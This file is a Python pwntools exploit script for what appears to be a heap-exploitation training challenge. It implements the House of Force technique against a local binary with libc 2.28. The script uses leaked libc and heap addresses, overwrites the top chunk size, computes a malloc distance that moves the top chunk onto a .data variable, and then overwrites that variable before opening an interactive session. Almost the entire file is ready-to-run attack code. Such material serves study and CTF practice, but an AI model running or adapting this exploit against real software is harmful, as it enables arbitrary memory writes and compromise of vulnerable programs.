#!/usr/bin/env python

"""
Python script to overwrite the "target" variable contained in .data by
implementing an arbitrary write primitive with the House of Force.
"""

from pwn import *

BINARY = './house_of_force'
LIBC = './libc-2.28.so'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)


"""Boilerplate pwnlib code."""
def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


"""Wrapper to request a chunk and send chunk data."""
def malloc(io, size, data):
    io.sendafter("> ", "1")
    io.sendafter("size: ", str(size))
    io.sendafter("data: ", data)


"""
Function to calculate the distance between two points in memory. Useful if
"y" is at a lower memory address than "x". Used to calculate the necessary
heap chunk size in order to relocate the top chunk to a lower memory address.
"""
def delta(x, y):
    return (0xffffffffffffffff - x) + y


def solve():
    io = conn()

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    io.recvuntil("heap @ ")
    heap = int(io.recvline(), 16)
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))
    log.info("heap start address found at: " + hex(heap))
    log.info("target found at: " + hex(elf.sym.target))

    # Overwrite the size value of the top chunk to the largest unsigned number.
    data = [
        cyclic(24, n=8),
        0xffffffffffffffff
    ]
    malloc(io, 24, flat(data))

    """
    Calculate the distance between the top chunk and the "target" variable. We
    account for the chunk that is already allocated and we want to land the
    top chunk 0x20 bytes before the target.
    """
    distance = delta(heap + 0x20, elf.sym.target - 0x20)
    log.info("distance between top chunk and target is: " + hex(distance))

    # Request a "distance" size chunk and input a junk value.
    malloc(io, distance, flat(0xdeadbeefcafebabe))
    # Request another chunk and overwrite the value of "target".
    malloc(io, 24, "GETPWNED")

    io.interactive()


if __name__ == "__main__":
    solve()
